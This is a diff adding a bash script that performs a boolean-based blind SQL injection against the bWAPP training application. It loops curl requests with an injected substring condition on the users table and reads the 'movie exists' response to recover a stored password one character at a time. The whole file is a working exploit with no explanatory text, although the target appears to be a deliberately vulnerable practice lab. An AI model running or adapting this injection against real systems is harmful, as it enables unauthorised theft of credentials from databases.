@@ -1,0 +1,36 @@
+#!/bin/bash
+
+# Base URL and headers for the curl request
+base_url="http://192.168.1.252/bWAPP/sqli_4.php"
+headers=(
+    -H 'Host: 192.168.1.252'
+    -H 'Upgrade-Insecure-Requests: 1'
+    -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36'
+    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
+    -H 'Referer: http://192.168.1.252/bWAPP/sqli_4.php?title=Iron+Man'
+    -H 'Accept-Encoding: gzip, deflate'
+    -H 'Accept-Language: en-US,en;q=0.9'
+    -H 'Connection: close'
+    -b 'PHPSESSID=b1716907df8d396703a040a4b457fdc1; security_level=0'
+)
+
+# Load the alphanumeric list into an array for efficient access
+mapfile -t alphanum_array < alphanum
+
+# Loop through each character position
+for number in $(seq 0 40); do
+    for alphanum in "${alphanum_array[@]}"; do
+        # Perform the curl request
+        response=$(curl -s -k "${headers[@]}" \
+            "$base_url?title=Iron+Man%27+AND+substring%28%28SELECT+password+FROM+bWAPP.users+limit+1%2C1%29%2C$number%2C1%29%3D%27$alphanum%27%3B+%23&action=search")
+
+        # Check if the response contains "movie exists"
+        if echo "$response" | grep -q "movie exists"; then
+            echo -ne "$alphanum"
+            break  # Exit inner loop when a match is found
+        fi
+    done
+done
+
+# Print a newline after completing the password retrieval
+echo ""
